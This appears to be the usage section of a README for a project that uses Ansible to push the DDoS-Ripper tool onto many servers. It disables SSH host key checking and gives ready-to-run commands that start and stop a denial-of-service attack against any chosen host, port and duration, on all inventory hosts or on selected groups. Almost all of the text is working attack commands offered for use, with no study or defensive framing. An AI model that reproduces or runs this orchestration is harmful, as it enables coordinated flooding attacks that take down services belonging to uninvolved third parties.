**Usage:**

#1. Install python3 and Ansible*
```
sudo apt install python3 python3-pip
sudo -H pip3 install --upgrade pip
pip3 install ansible==2.9.7
```

Create ansible config file:
```
mkdir -p /etc/ansible
vim /etc/ansible/ansible.cfg

$ cat /etc/ansible/ansible.cfg
[defaults]
host_key_checking = False
callback_whitelist = profile_tasks
timeout = 300
command_warnings = False
[inventory]
[privilege_escalation]
[paramiko_connection]
[ssh_connection]
ssh_args = -C -o ControlMaster=auto -o ControlPersist=600s -o UserKnownHostsFile=/dev/null
control_path = /tmp/ansible-ssh-%%h-%%p-%%r
pipelining = True
[persistent_connection]
connect_timeout = 300
[accelerate]
[selinux]
[colors]
[diff]
```

Clone git repo:
```
mkdir -p /opt/git
cd /opt/git
git clone https://github.com/deadmopozz/ddos-ripper-ansible.git
```

#2. Prepare inventory /opt/git/ddos-ripper-ansible/inventory/hosts:
- add your hosts as follow:
```
[all]
#Add hosts to this group
host1      ansible_host=127.0.0.1
host2      ansible_host=127.0.0.2


[all:vars]
git_repo=https://github.com/palahsu/DDoS-Ripper.git
git_dest=/tmp/ddos-ripper


[group1]
host1

[group2]
host2
```

#3. Run playbook and start/stop attack:

##You must have the same username and password or ssh key for each server

##If you use username and password for ssh authentication:
```
cd /opt/git/ddos-ripper-ansible/playbooks/initial-setup
ansible-playbook -i ../../inventory/hosts initial-setup.yml -b -kK -e ansible_user=user_name
```
### Start attack on all hosts
```
cd /opt/git/ddos-ripper-ansible/playbooks/initial-setup
ansible all -i ../../inventory/hosts -b -kK -e ansible_user=user_name -m shell -a "/tmp/ddos-ripper/ddos-ripper-start.sh <host> <port> <duration>"
```
### Start attack on one or several groups of hosts
```
cd /opt/git/ddos-ripper-ansible/playbooks/initial-setup
ansible all -i ../../inventory/hosts -b -kK -e ansible_user=user_name -m shell -a "/tmp/ddos-ripper/ddos-ripper-start.sh <host> <port> <duration>" -l group1,group2
```
### Stop attack on all hosts
```
cd /opt/git/ddos-ripper-ansible/playbooks/initial-setup
ansible all -i ../../inventory/hosts -b -kK -e ansible_user=user_name -m shell -a "/tmp/ddos-ripper/ddos-ripper-stop.sh"
```

##If you use ssh key for ssh authentication:
```
cd /opt/git/ddos-ripper-ansible/playbooks/initial-setup
ansible-playbook -i ../../inventory/hosts initial-setup.yml -b -kK -e ansible_user=user_name ansible_ssh_private_key_file="/path/to/your/ssh.key"
```
### Start attack on all hosts
```
cd /opt/git/ddos-ripper-ansible/playbooks/initial-setup
ansible all -i ../../inventory/hosts -b -kK -e ansible_user=user_name ansible_ssh_private_key_file="/path/to/your/ssh.key" -m shell -a "/tmp/ddos-ripper/ddos-ripper-start.sh <host> <port> <duration>"
```
### Start attack on one or several groups of hosts
```
cd /opt/git/ddos-ripper-ansible/playbooks/initial-setup
ansible all -i ../../inventory/hosts -b -kK -e ansible_user=user_name ansible_ssh_private_key_file="/path/to/your/ssh.key" -m shell -a "/tmp/ddos-ripper/ddos-ripper-start.sh <host> <port> <duration>" -l group1,group2
```
### Stop attack on all hosts
```
cd /opt/git/ddos-ripper-ansible/playbooks/initial-setup
ansible all -i ../../inventory/hosts -b -kK -e ansible_user=user_name ansible_ssh_private_key_file="/path/to/your/ssh.key" -m shell -a "/tmp/ddos-ripper/ddos-ripper-stop.sh"
```

